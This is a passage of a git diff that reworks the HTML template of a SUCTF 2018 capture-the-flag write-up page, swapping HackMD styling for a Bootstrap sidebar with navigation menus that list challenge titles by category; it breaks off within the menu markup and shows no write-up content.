@@ -1,53 +1,376 @@
-<!DOCTYPE html>
-
-<html lang="en">
-
-<head>
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
     <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta name="mobile-web-app-capable" content="yes">
-    <title>
-        SUCTF 2018 - HackMD
-    </title>
-    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
-    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>SUCTF 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
 
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.7.0/styles/github-gist.min.css" integrity="sha256-tAflq+ymku3Khs+I/WcAneIlafYgDiOQ9stIHH985Wo=" crossorigin="anonymous" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/emojify.js/1.1.0/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
-    <style>
-        @import url(https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400italic,600,600italic,300italic,300|Source+Serif+Pro|Source+Code+Pro:400,300,500&subset=latin,latin-ext);.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{padding:0 1em;color:#777;border-left:.25em solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:0;padding-top:.2em;padding-bottom:.2em;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\A0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.markdown-body kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0 none}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,sans-serif;padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram{text-align:center;background-color:inherit;border-radius:0;white-space:inherit}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg{max-width:100%;height:100%}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p,.markdown-body .alert>ul{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.MJX_Assistive_MathML{display:none}.ui-infobar{position:relative;z-index:2;max-width:758px;margin-top:25px;margin-bottom:-25px;color:#777}.ui-toc{position:fixed;bottom:20px;z-index:10000}.ui-toc-label{opacity:.3;background-color:#ccc;border:none;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child > ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,Hiragino Kaku Gothic Pro,\\30D2\30E9\30AE\30CE\89D2\30B4 Pro W3,Osaka,Meiryo,\\30E1\30A4\30EA\30AA,MS Gothic,"\FF2D\FF33   \30B4\30B7\30C3\30AF",sans-serif}.ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,"\FF2D\FF33   \FF30\30B4\30B7\30C3\30AF",sans-serif}.markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang TC,Microsoft JhengHei,\\5FAE\8EDF\6B63\9ED1,sans-serif}.ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,\\5FAE\8EDF\6B63\9ED1UI,sans-serif}.markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang SC,Microsoft YaHei,\\5FAE\8F6F\96C5\9ED1,sans-serif}.ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,\\5FAE\8F6F\96C5\9ED1UI,sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:contain}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}.ui-infobar>small>span{line-height:22px}.ui-infobar>small .dropdown{display:inline-block}.ui-infobar>small .dropdown a:focus,.ui-infobar>small .dropdown a:hover{text-decoration:none}.unselectable{-moz-user-select:none;-webkit-user-select:none;-o-user-select:none;user-select:none}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;font-family:Source Sans Pro,Helvetica,Arial,sans-serif;letter-spacing:.025em}.focus,:focus{outline:none!important}::-moz-focus-inner{border:0!important}body.modal-open{overflow-y:auto;padding-right:0!important}
-    </style>
-    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
-    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
-    <!--[if lt IE 9]>
-    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
-    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
-    <![endif]-->
-</head>
+  .sticky-offset {
+      top: 56px;
+  }
 
-<body>
-    <div id="doc" class="markdown-body container-fluid"><h1 id="SUCTF-2018" style=""><a class="anchor hidden-xs" href="#SUCTF-2018" title="SUCTF-2018"><span class="octicon octicon-link"></span></a>SUCTF 2018</h1><p></p><div class="toc"><ul><li><a href="#SUCTF-2018" title="SUCTF 2018">SUCTF 2018</a><ul><li><a href="#web" title="web">web</a><ul><li><a href="#Anonymous-bookgin" title="Anonymous (bookgin)">Anonymous (bookgin)</a></li><li><a href="#Getshell-unsolved-written-bookgin" title="Getshell (unsolved, written bookgin)">Getshell (unsolved, written bookgin)</a></li></ul></li><li><a href="#rev" title="rev">rev</a><ul><li><a href="#python-sasdf" title="python (sasdf)">python (sasdf)</a></li><li><a href="#Enigma-sasdf" title="Enigma (sasdf)">Enigma (sasdf)</a></li><li><a href="#Rubber-Ducky-sasdf" title="Rubber Ducky (sasdf)">Rubber Ducky (sasdf)</a></li><li><a href="#RoughLike与期末大作业-sces60107" title="RoughLike与期末大作业 (sces60107)">RoughLike与期末大作业 (sces60107)</a></li><li><a href="#babyre-sces60107" title="babyre (sces60107)">babyre (sces60107)</a></li><li><a href="#simpleformat-sces60107" title="simpleformat (sces60107)">simpleformat (sces60107)</a></li></ul></li><li><a href="#misc" title="misc">misc</a><ul><li><a href="#TNT-sasdf-bookgin" title="TNT (sasdf, bookgin)">TNT (sasdf, bookgin)</a></li><li><a href="#SandGame-b04902036" title="SandGame (b04902036)">SandGame (b04902036)</a></li><li><a href="#Cyclic-b04902036" title="Cyclic (b04902036)">Cyclic (b04902036)</a></li><li><a href="#Game-b04902036" title="Game (b04902036)">Game (b04902036)</a></li></ul></li><li><a href="#pwn" title="pwn">pwn</a><ul><li><a href="#Note-kevin47" title="Note (kevin47)">Note (kevin47)</a></li><li><a href="#Heap-b04902036" title="Heap (b04902036)">Heap (b04902036)</a></li></ul></li><li><a href="#crypto" title="crypto">crypto</a><ul><li><a href="#Enjoy-b04902036" title="Enjoy (b04902036)">Enjoy (b04902036)</a></li><li><a href="#Rsa-good-b04902036" title="Rsa good (b04902036)">Rsa good (b04902036)</a></li><li><a href="#magic-sasdf" title="magic (sasdf)">magic (sasdf)</a></li><li><a href="#rsa-sasdf" title="rsa (sasdf)">rsa (sasdf)</a></li><li><a href="#pass-sasdf" title="pass (sasdf)">pass (sasdf)</a></li></ul></li></ul></li></ul></div><p></p><h2 id="web" style=""><a class="anchor hidden-xs" href="#web" title="web"><span class="octicon octicon-link"></span></a>web</h2><h3 id="Anonymous-bookgin" style=""><a class="anchor hidden-xs" href="#Anonymous-bookgin" title="Anonymous-bookgin"><span class="octicon octicon-link"></span></a>Anonymous (bookgin)</h3><ul>
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#anonymous-(bookgin)">anonymous-(bookgin)</a>
+    
+                <a class="dropdown-item" href="#getshell-(unsolved,-written-bookgin)">getshell-(unsolved,-written-bookgin)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#python-(sasdf)">python-(sasdf)</a>
+    
+                <a class="dropdown-item" href="#enigma-(sasdf)">enigma-(sasdf)</a>
+    
+                <a class="dropdown-item" href="#rubber-ducky-(sasdf)">rubber-ducky-(sasdf)</a>
+    
+                <a class="dropdown-item" href="#roughlike与期末大作业-(sces60107)">roughlike与期末大作业-(sces60107)</a>
+    
+                <a class="dropdown-item" href="#babyre-(sces60107)">babyre-(sces60107)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#tnt-(sasdf,-bookgin)">tnt-(sasdf,-bookgin)</a>
+    
+                <a class="dropdown-item" href="#sandgame-(b04902036)">sandgame-(b04902036)</a>
+    
+                <a class="dropdown-item" href="#cyclic-(b04902036)">cyclic-(b04902036)</a>
+    
+                <a class="dropdown-item" href="#game-(b04902036)">game-(b04902036)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#note-(kevin47)">note-(kevin47)</a>
+    
+                <a class="dropdown-item" href="#heap-(b04902036)">heap-(b04902036)</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
